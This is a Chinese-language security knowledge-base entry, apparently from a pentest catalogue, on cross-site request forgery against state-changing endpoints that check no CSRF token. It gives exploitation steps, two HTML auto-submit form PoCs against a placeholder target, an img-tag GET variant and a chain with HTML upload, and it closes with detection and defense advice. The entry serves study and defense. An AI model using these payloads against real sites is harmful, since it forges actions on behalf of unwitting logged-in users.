---
id: web-generic-csrf-missing-token-state-changing-endpoint
title: 状态变更接口无 CSRF Token：跨站自动提交表单以受害者身份添加/删除数据
type: scenario
domain: web
path: web/generic/csrf
technique: csrf-missing-token
aliases:
- CSRF
- 跨站请求伪造
- 无 Token CSRF
- SameSite 缺失 CSRF
tags:
- web
- csrf
- session
- missing-token
- state-changing
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:29:51+08:00'
  notes: 已对照原文与图09-14核对：addStudent/删除等状态变更接口无 CSRF Token，Burp 生成 PoC 经上传图片托管后由教师打开触发，学生列表新增记录成功。原文未涉及组件版本，未设置 affected_versions。未复现 PoC。
---

## 一句话结论

当增删改接口只依赖会话 Cookie 鉴权、既不校验 CSRF Token 也不校验 Origin/Referer 时，攻击者构造自动提交的跨站表单，即可让已登录受害者在不知情下完成添加、删除等操作。

## 原理

浏览器会自动把目标站点的 Cookie 附加到跨站发起的请求上（Cookie 的 SameSite 默认策略取决于浏览器与服务器设置；老应用常未显式设置，旧浏览器默认全放行）。服务端若只从会话取身份、没有额外的不可预测令牌，就无法区分请求是受害者本人在页面上发起，还是第三方页面伪造。攻击者只需让受害者加载一个 HTML 页面，页面在加载时自动提交表单到目标接口，浏览器带上受害者 Cookie，服务端按正常业务流程执行。

## 触发条件

- 鉴权完全依赖 Cookie/Session；
- 状态变更接口（POST 添加、删除、审批、转账等）无 CSRF Token、无 Origin/Referer 校验；
- Cookie 未设置 `SameSite=Lax/Strict`，或浏览器默认放行跨站 POST；
- 接口接受简单表单可构造的编码（`application/x-www-form-urlencoded`、`multipart/form-data`；JSON 通常还受 CORS/预检限制）。

## 利用步骤

1. 用低权限账号找到状态变更接口，抓包确认参数与 Content-Type；
2. 构造等价 HTML 表单，`action` 指向目标接口，字段与抓包一致；
3. 用 JS 在页面加载时 `form.submit()` 自动提交；
4. 将该 HTML 放到攻击者站点，或通过目标站的上传/存储功能托管（见“任意后缀上传 HTML”卡）；
5. 诱导已登录的高权限用户打开页面，随后在目标站确认数据变化。

## PoC

自动提交表单（`application/x-www-form-urlencoded`）：

```html
<form id="f" action="https://target/student/addStudent" method="POST">
  <input name="username" value="attacker">
  <input name="clazzId" value="1">
  <input name="sex" value="男">
</form>
<script>document.getElementById('f').submit();</script>
```

文件上传类接口需 `multipart/form-data`，用 Burp 生成的 PoC 结构：

```html
<form action="https://target/student/addStudent" method="POST" enctype="multipart/form-data">
  <input type="text" name="username" value="attacker">
  <input type="file" name="file">
</form>
<script>
  // 需要浏览器允许脚本填充文件时，可改为纯文本字段或使用 data URL
  document.forms[0].submit();
</script>
```

## 变体与关联

- 删除接口同理：把 `action` 与参数替换为删除请求；
- GET 型状态变更可直接用 `<img src="https://target/delete?id=1">` 触发，无需表单；
- 与任意 HTML 上传组合：把 CSRF 页面传到目标同源静态目录，再诱导受害者打开，绕过“外站 HTML 无法携带 Cookie”的误区（同源更加稳定）；
- 关联：点击劫持（需要用户点击）、CORS 配置错误（可读响应）。

## 检测与防御

- 检测：状态变更请求缺少 `csrf_token`/自定义头；`Origin`/`Referer` 为空或为外站；同一会话短时间内出现异常来源的操作；
- 防御：所有状态变更接口校验同步令牌（CSRF Token）或双提交 Cookie；校验 `Origin`/`Referer`；Cookie 设置 `SameSite=Lax`（或 Strict）与 `Secure`；敏感操作要求二次认证；
- 架构：不要把“仅登录校验”当作授权，写操作应有独立权限与审计。
